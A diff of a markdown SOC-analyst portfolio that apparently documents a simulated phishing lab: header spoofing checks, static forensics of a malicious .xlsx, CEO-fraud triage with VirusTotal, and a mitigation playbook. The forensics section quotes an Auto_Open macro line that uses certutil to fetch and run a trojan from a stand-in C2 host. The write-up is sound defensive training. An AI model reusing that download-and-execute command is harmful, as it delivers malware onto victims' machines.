@@ -6,11 +6,12 @@
 ## 📌 Project Context & Disclaimer
 > **⚠️ Educational Lab Scenario:** 
 > This investigation was conducted using simulated artifacts (.eml/.msg email files, header logs, and untrusted links/files) provided by the Linuxenic Corp. cybersecurity training platform. This report has been compiled chronologically into a single comprehensive case study to demonstrate the incident response capabilities of a SOC analyst. 
-
 ---
 
-## Manual Analysis of The Header and Body 
-The SOC team received a report of a potentially malicious email. The email contained a link intended for employees
+## 📖 Incident Workflow & Methodology
+To mirror a real-world Security Operations Center (SOC) triage process, this portfolio covers four distinct phishing techniques commonly engineered by threat actors, transitioning from manual log analysis to static file forensics and threat intelligence automation.
+
+### 📁 Phase 1: Manual Header Analysis & Identity Spoofing Detection
 
 
 **Case 1**
@@ -24,6 +25,12 @@ employee@linuxenic-corp.com
 Date
 Mon, 27 Jan 2025 09:15:42 +0700
 ```
+
+* **What:** The SOC team triaged a suspicious email claiming to originate from the internal IT Support Team (`support@linuxenic-corp.com`) targeting an employee. 
+* **How:** A manual inspection of the raw email source code (*Show Original*) was conducted to verify sender authenticity by checking the mail routing logs and authentication markers (`SPF`, `DKIM`, `DMARC`).
+* **Why & Findings:** 
+  The analysis revealed a classic **Brand Impersonation & Identity Spoofing** attack. The header logs exposed severe mismatches:
+  
 Show original :
 ```
 Return-Path: <bounce@suspicious-domain.xyz>
@@ -76,7 +83,7 @@ Sent using **PHPMailer** from the send_phish.php script. This indicates that thi
   ```
   Return-Path: <noreply@sfrloyer.com>
   ```
-* **How:** The attacker sends a file purporting to be a notification from DHL. However, there is something suspicious about it: the file is in .xlsx format. Once the target opens the file, a script from the attacker runs automatically to download a malicious file from the attacker’s server and execute it immediately.
+* **How:** The attacker sends a file purporting to be a notification from DHL. However, there is something suspicious about it: the file is in .xlsx format. Once the target opens the file, a script from the attacker runs automatically to download a malicious file from the attacker’s server and execute it immediately. Therefore, static file forensics was performed in an isolated Linux environment using the file command to verify its true extension, and the strings command to extract plaintext data.
 
 To view the contents of an attachment in an email that you suspect is malicious, do not open the attachment directly. Use “file [file_name]” to view the original format of the attached file. Then examine the file's strings using “strings [file_name]”.
 
@@ -114,7 +121,7 @@ Focus on
 Sub Auto_Open()
 Shell "cmd /c certutil -urlcache -split -f http://c2.malware-drop.xyz/dhl_trojan.exe %TEMP%\svchost.exe && start %TEMP%\svchost.exe"
 ```
-Once the malware has been successfully downloaded from the attacker’s server, it is saved with a name similar to that of a genuine Windows process and runs immediately after being downloaded.
+**Conclusion:** The script utilizes the Auto_Open() execution trigger. Upon opening, it spawns a command shell (cmd.exe) and abuses a legitimate native Windows binary (certutil.exe) to stealthily download a malicious payload (dhl_trojan.exe) from the C2 server, masquerading it as a legitimate system process (svchost.exe) in the temporary folder.
 
 
 ## Email Analysis With Tools
@@ -136,14 +143,12 @@ Date
 Tue, 28 Jan 2025 09:14:22 +0000
 ```
 
-Protonmail.com is not a corporate email service, such emails should be treated with suspicion as potentially dangerous.
-
 ```
 Delivered-To: employee@linuxenic-corp.com
 Return-Path: <ceo-urgent@offshore-bizfin.xyz>
 Received: from mail-out.offshore-bizfin.xyz 
 ```
-The return path also doesn't match the “From” field. This indicates that the email is malicious. Any attachments sent via this email are also certainly malicious. Analyzing the contents of a malicious email attachment directly can be dangerous. Specialized tools for analyzing phishing emails are the most effective way to handle this.
+**What:** A targeted CEO Fraud/Spear-Phishing email impersonating the executive office (m.anderson@linuxenic-corp.com) was investigated. *Protonmail.com* is not a corporate email service, such emails should be treated with suspicion as potentially dangerous.The return path also doesn't match the “From” field. This indicates that the email is malicious. Any attachments sent via this email are also certainly malicious. Analyzing the contents of a malicious email attachment directly can be dangerous. Specialized tools for analyzing phishing emails are the most effective way to handle this.
 
 ```
 INVOICE: GlobalTech Solutions Ltd.
@@ -169,8 +174,35 @@ SHA256: 6d55f25222831cce73fd9a64a8e5a63b002522dc2637bd2704f77168c7c02d88
 Classification: Emotet Dropper (Epoch 5)
 Source: MalwareBazaar / abuse.ch
 ```
-Analyze the file contents to extract information and the SHA256 hash for comparison using specialized tools for phishing email analysis like **Virustotal**.
+**How:** Advanced triage tools were utilized to automatically parse the email components, extract indicators of compromise (IoCs), and correlate the file hashes with global security intelligence databases like VirusTotal.
+Analyze the file contents to extract information and the SHA256 hash for comparison using specialized tools for phishing email analysis (**Virustotal**).
+
+**Why & Findings:** Initial triage caught an external Reply-To mismatch pointing to a free public domain (m.anderson.ceo@protonmail.com) and a fraudulent transfer request of USD 47,250.00.
+ * Malicious URIs: http://wire-payment.globaltech-invoice.xyz
+ * SHA256 Hash: 6d55f25222831cce73fd9a64a8e5a63b002522dc2637bd2704f77168c7c02d88
+
+The automated extraction pulled out malicious URIs and a file attachment hash:
 
 ![Ikon Email](Image/email5.png)
 
 This file has been detected as malware. You can view a lot of information here, such as the malware family name, the original file name, etc.
+
+
+## Incident Response & Mitigation Playbook ##
+
+Based on the multi-phased forensic investigation above, the following immediate containment and strategic hardening measures were recommended:
+
+**1. Immediate Containment (Tactic Action):**
+   * **Network Blocking:** Block all malicious IoC domains (suspicious-domain.xyz, malicious.xyz, c2.malware-drop.xyz, and offshore-bizfin.xyz) at the corporate Firewall and Secure Web Gateway (SWG).
+   * **EDR Blacklisting:** Feed the Emotet SHA256 hash into the Endpoint Detection and Response (EDR) system to automatically quarantine the file across all corporate endpoints.
+   * **Mail Purging:** Execute a cluster-wide email purge script to permanently delete these specific phishing templates from all user mailboxes.
+
+**2. Long-Term System Hardening (Strategic Defense):**
+   * **Enforce Email Authentication:** Tighten corporate inbound mail rules to strictly REJECT emails that fail SPF, DKIM, and DMARC alignment checks to eliminate identity spoofing.
+   * **Block Dangerous Office Macros:** Implement a Group Policy Object (GPO) to completely disable VBA macros in Microsoft Office files downloaded from the internet.
+   * **User Security Awareness:** Launch targeted training focusing on Spear-Phishing/CEO Fraud identification and reporting procedures for finance/HR departments.
+
+
+## Key Takeaway ##
+* **Look Beyond the Display Name:** Tactic headers like Return-Path and authentication log fails are definitive indicators of truth; external display names should never be trusted blindly.
+* **Living-off-the-Land (LotL) Awareness:** Attackers frequently abuse built-in system tools like certutil.exe to bypass traditional antivirus software, necessitating robust behavioral monitoring on endpoints.
